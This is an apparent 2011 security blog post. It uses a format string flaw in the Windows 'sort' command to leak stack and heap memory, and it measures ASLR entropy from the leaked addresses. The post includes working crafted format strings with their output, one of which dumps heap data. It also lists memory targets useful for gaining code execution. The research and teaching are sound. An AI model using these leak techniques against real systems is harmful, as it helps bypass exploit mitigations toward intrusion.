---
title: "Leveraging format string vulnerabilities to interrogate Win32 process memory"
date: 2011-06-20T18:19:00.012-04:00
draft: false
type: posts
summary: "Although format string vulnerabilities aren't seen as much in the wild these days since they are so easy to spot in source code, I'd like to use this class of vulnerability to demonstrate what information can be inferred from a memory leak. Format string vulnerabilities open a window into the"
categories: 
- ASLR,memory leaks,format string vulnerabilities
---
# Leveraging format string vulnerabilities to interrogate Win32 process memory


<br/>
Although format string vulnerabilities aren't seen as much in the wild these days since they are so easy to spot in source code, I'd like to use this class of vulnerability to demonstrate what information can be inferred from a memory leak. Format string vulnerabilities open a window into the stack, allowing you to interrogate process memory. As a case study I'll be utilizing a format string vulnerability in a Windows utility that has persisted since the dawn of unix time - sort.

  

The vulnerability lies in the filename command line argument of the sort utility. The source likely implements the following function call\[[1](#1)\]:

  

fprintf(file\_stream, filename);

  

Secure format strings 101 would teach you that this is wrong. Nonetheless, some crusty old Microsoft employee made the mistake and MS has deemed this vulnerability not important enough to update. I digress.

  

Some notes about Microsoft's implementation of fprintf in sort as of XP SP3 - Windows 7:

-   The %n format specifier is disabled preventing arbitrary 4-byte overwrites
-   Direct parameter access (%5$p) is disabled which results in very long format strings

  

The following example shows the layout of the function arguments on the stack:

  

C:\\>sort AAAA:%p:%p:%p:%p:%p:%p:%p:

AAAA:761A35D9:00000000:00000000:00000000:003F47C8:0000001A:41414141:

  

Knowledge of the how arguments are passed to the printf function would indicate the following:

-   1st dword: address of the FILE struct
-   5th dword: pointer to format-string (unicode)
-   6th dword: number of characters printed
-   7th dword: hex representation of the first four characters of the format string

  

To show that the 5th dword actually points to a unicode representation of the format string, the command can be edited as follows:

  

C:\\>sort AAAA:%p:%p:%p:%p:%ls

AAAA:761A35D9:00000000:00000000:00000000:AAAA:%p:%p:%p:%p:%ls:%p:...

  

By dereferencing the pointer as a wide string (%ls), the format string was reflected in stderr.

  

Some analysis of the above output indicates the presensence of ASLR:

  

C:\\>for /L %i in (1,1,20) do @(sort AAAA:%p:%p:%p:%p:%p:)

AAAA:761A35D9:00000000:00000000:00000000:00**05**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**37**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**0E**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**3F**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**17**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**18**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**22**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**17**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**06**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**11**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**23**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**40**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**2E**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**38**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**27**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**28**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**39**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**2C**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**1A**47A8:...

AAAA:761A35D9:00000000:00000000:00000000:00**29**47A8:...

  

Notice that the 2nd byte of the format string pointer changes each time. After sampling approximately 10000 addresses, some interesting statistics were gleaned:

  

2nd byte Occurances Rate of occurance

05       117        1.2%

06       135        1.4%

07       109        1.1%

08        97        1.0%

09       151        1.5%

0A       129        1.3%

0B       147        1.5%

1C       124        1.2%

1D       156        1.6%

1E       193        1.9%

1F       225        2.3%

20       192        1.9%

21       211        2.1%

22       199        2.0%

23       207        2.1%

24       199        2.0%

25       198        2.0%

26       213        2.1%

27       241        2.4%

28       185        1.9%

29       238        2.4%

2A       256        2.6%

2B       268        2.7%

2C       246        2.5%

2D       277        2.8%

2E       285        2.9%

2F       275        2.8%

30       318        3.2%

31       310        3.1%

32       321        3.2%

33       293        2.9%

34       301        3.0%

**35       331        3.3%**

36       301        3.0%

37       312        3.1%

38       306        3.1%

39       323        3.2%

3A       312        3.1%

3B       306        3.1%

3C       102        1.0%

3D       121        1.2%

3E       108        1.1%

3F        94        0.9%

40        99        1.0%

41        90        0.9%

42        87        0.9%

43        67        0.7%

44        54        0.5%

45        41        0.4%

46        35        0.4%

47        32        0.3%

48        22        0.2%

49        10        0.1%

  

Occurances divided by 5 (to save space)

\==================================

05 #######################

06 ###########################

07 #####################

08 ###################

09 ##############################

0A #########################

0B #############################

1C ########################

1D ###############################

1E ######################################

1F #############################################

20 ######################################

21 ##########################################

22 #######################################

23 #########################################

24 #######################################

25 #######################################

26 ##########################################

27 ################################################

28 #####################################

29 ###############################################

2A ###################################################

2B #####################################################

2C #################################################

2D #######################################################

2E #########################################################

2F #######################################################

30 ###############################################################

31 ##############################################################

32 ################################################################

33 ##########################################################

34 ############################################################

35 ##################################################################

36 ############################################################

37 ##############################################################

38 #############################################################

39 ################################################################

3A ##############################################################

3B #############################################################

3C ####################

3D ########################

3E #####################

3F ##################

40 ###################

41 ##################

42 #################

43 #############

44 ##########

45 ########

46 #######

47 ######

48 ####

49 ##

  

Most frequently used address: 0x0035XXXX

Times used: 331

  

As indicated in this beautiful ASCII bar graph, ASLR clearly favors some adresses over others. This lack of entropy (5-6 bits according to this data) would also indicate that these are heap addresses. Ollie Whitehouse wrote an excellent paper\[[2](#2)\] on the analysis of ASLR in Vista so I will keep my entropy analysis short and sweet.

  

To demonstrate the weakness of ASLR in the heap, I'll show that within several attempts, one can read arbitrary data from the heap. As an example, I will read a portion of the environment variables stored in the heap (in unicode). The environment variables are generally stored in the same area relative to their allocated page in memory. Since we know an address in the heap - the format string pointer and a likely value for the second byte in the address, we should be able to read memory given enough tries. My format string is set up in the following manner:

  

sort AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pZZCBA

  

By changing the last format specifier (%p) to %ls, I can dereference 0x00414243 as a wide string (note little-endianness). I want to dereference a likely heap address though. A portion of the environment variables are usually stored in the vicinity of 0x00XX0E30. I'll go with 2E for the 2nd byte because I'm feeling lucky. To deference 0x002E0E30, the format string will have to be updated:

  

sort AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p:%ls0^N.

where ^N can be entered by pressing ALT-014

  

Note that this will likely crash several times since you may be dereferencing unallocated memory. However, after 14 trials, a portion of the path variable was revealed:

  

C:\\>sort AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p:%ls0^N.

AAAA761A35D9000000000000000000000000002E48200000002B414141417025702570257025702570257025702570257025702570257025702570257025736C253:**\\windows\\System32\\W**

**indowsPowerShell\\v1.0\\;C:\\PROGRA~1\\DISKEE~1\\DISKEE~1\\;C:\\Program Files\\QuickTime\\QTSystem\\;C:\\Program Files\\Windows Imaging\\0♫**.The system cannot find

the file specified.

  

Is this useful? Probably not. I merely chose this example to demonstrate the weakness of ASLR in the heap.

  

So now that heap addresses have been located, what about stack addresses? The following, gargantuan format string will shed some light on this:

  

C:\\>sort :%p:%p:%p:%p:%p:%p:%p:%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x:%p:%p:%p:%x%x%x%x%x:%p:%p:%p:%p:%p:%p:%p:%p:%p:%p:%x%x:%p:%x%x%x%x%x:%p:%p:%p:%p:%p: :761A35D9:00000000:00000000:00000000:003E6950:000006CF:3A70253A:253A702570253A703A70253A253A702578253A70782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825253A782570253A703A70253A7825782578257825253A782570253A703A70253A253A702570253A703A70253A253A702570253A702578253A70253A782578253A257825783A782578253A702570253A703A70253A3A702500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000:000000CB:00010580:00010000:00000:00000081:0021E6C0:000000CB:00010000:00010580:0021E6C0:77B46FEA:77B47026:792AF039:00010000:00:00010148:00000:00010580:00010000:81000081:00010148:00010BE0:The filename or extension is too long.  

  

It would appear as if there are some saved frame pointers, function arguments, local variables, and return pointers here. Let's do some more analysis to be more certain:

  

I ran the above command 20 times and truncated everything but a portion of the lower part of the stack, which yielded the following:

  

:00000081:00**11EC04**:000000CB:00010000:00010580:00**11EC04**:77B46FEA:77B47026:79**16B8C8**:00010000:...  
:00000081:00**1AE7C0**:000000CB:00010000:00010580:00**1AE7C0**:77B46FEA:77B47026:79**1DB34A**:00010000:...  
:00000081:00**18EB10**:000000CB:00010000:00010580:00**18EB10**:77B46FEA:77B47026:79**1FBFA9**:00010000:...  
:00000081:00**12E614**:000000CB:00010000:00010580:00**12E614**:77B46FEA:77B47026:79**15B27C**:00010000:...  
:00000081:00**1FEAB4**:000000CB:00010000:00010580:00**1FEAB4**:77B46FEA:77B47026:79**18BE92**:00010000:...  
:00000081:00**15E780**:000000CB:00010000:00010580:00**15E780**:77B46FEA:77B47026:79**12B055**:00010000:...  
:00000081:00**18E608**:000000CB:00010000:00010580:00**18E608**:77B46FEA:77B47026:79**1FB18C**:00010000:...  
:00000081:00**0DEC88**:000000CB:00010000:00010580:00**0DEC88**:77B46FEA:77B47026:79**0ABB3B**:00010000:...  
:00000081:00**09EB10**:000000CB:00010000:00010580:00**09EB10**:77B46FEA:77B47026:79**0EBC61**:00010000:...  
:00000081:00**18EB18**:000000CB:00010000:00010580:00**18EB18**:77B46FEA:77B47026:79**1FBC38**:00010000:...  
:00000081:00**0BE71C**:000000CB:00010000:00010580:00**0BE71C**:77B46FEA:77B47026:79**0CB1D3**:00010000:...  
:00000081:00**0BE8F4**:000000CB:00010000:00010580:00**0BE8F4**:77B46FEA:77B47026:79**0CBE79**:00010000:...  
:00000081:00**12E954**:000000CB:00010000:00010580:00**12E954**:77B46FEA:77B47026:79**15BFE8**:00010000:...  
:00000081:00**0AE8D8**:000000CB:00010000:00010580:00**0AE8D8**:77B46FEA:77B47026:79**0DBEB3**:00010000:...  
:00000081:00**1CEA90**:000000CB:00010000:00010580:00**1CEA90**:77B46FEA:77B47026:79**1BBCB9**:00010000:...  
:00000081:00**08E4F4**:000000CB:00010000:00010580:00**08E4F4**:77B46FEA:77B47026:79**0FBD2C**:00010000:...  
:00000081:00**1EEA1C**:000000CB:00010000:00010580:00**1EEA1C**:77B46FEA:77B47026:79**19B39B**:00010000:...  
:00000081:00**0EE95C**:000000CB:00010000:00010580:00**0EE95C**:77B46FEA:77B47026:79**09B1AD**:00010000:...  
:00000081:00**19E7F8**:000000CB:00010000:00010580:00**19E7F8**:77B46FEA:77B47026:79**1EBF57**:00010000:...  
:00000081:00**0BE574**:000000CB:00010000:00010580:00**0BE574**:77B46FEA:77B47026:79**0CBD2A**:00010000:...

  

Look at the dwords 2, 6, and 9. The last 6 bytes are different after each run. This result is consistant with the ASLR implementation of 14 bits of entropy in the stack. So now we've positively identified heap, and stack addresses (process or thread). Now, notice dwords 7-8. The addresses do not change and they are consistant with addresses to loaded modules. To prove this, if you rebooted, and analyzed the same portion of the stack, the addresses would be different since loaded modules are only randomized after reboots.

  

**Conclusion:**

  

With just a little bit of context, you can easily infer the type of data/code on the stack. In fact, ASLR actually helps in determining the difference between the stack, heap, PEB, and image base (loaded module code) due to the difference in entropy bits.

  

This serves as an example where memory leaks coupled with memory corruption despite modern exploit mitigations will very likely lead to code execution. In the context of a format string vulnerability, even if %n is disabled, at the very minimum, shellcode can be placed into memory via the format string. Given any combination of vulnerabilties, the exploitation possibilities are numerous. However, increasingly, with all the modern exploit mitigations, exploitation is becoming very application-specific.

  

As a refresher here are some useful addresses in memory can help lead to code execution:

-   FS:\[0\] - Pointer to the SEH chain
-   FS:\[30\] - Pointer to the PEB
-   Executable's .data + 4 offset: master GS cookie
-   PEB+20: FastPEBLock pointer
-   PEB+24: FastPEBUnlock
-   Stack return pointers: duh
-   Function pointers
-   C++ Vtables

  

Links for reference:

  

1\. Microsoft, "Format Specification Fields: printf and wprintf Functions," [http://msdn.microsoft.com/en-us/library/56e442dc.aspx](http://msdn.microsoft.com/en-us/library/56e442dc.aspx)

  

2\. O. Whitehouse, "An Analysis of Address Space Layout Randomization on Windows Vista™," 2007, [http://www.symantec.com/avcenter/reference/Address\_Space\_Layout\_Randomization.pdf](http://www.symantec.com/avcenter/reference/Address_Space_Layout_Randomization.pdf)

  

3\. P. Haas, "Advanced Format String Attacks," 2010, [http://defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf](http://defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf)

![](https://blogger.googleusercontent.com/tracker/6052198192158185644-5818290250132367839?l=exploit-monday.com)

<br/>
---
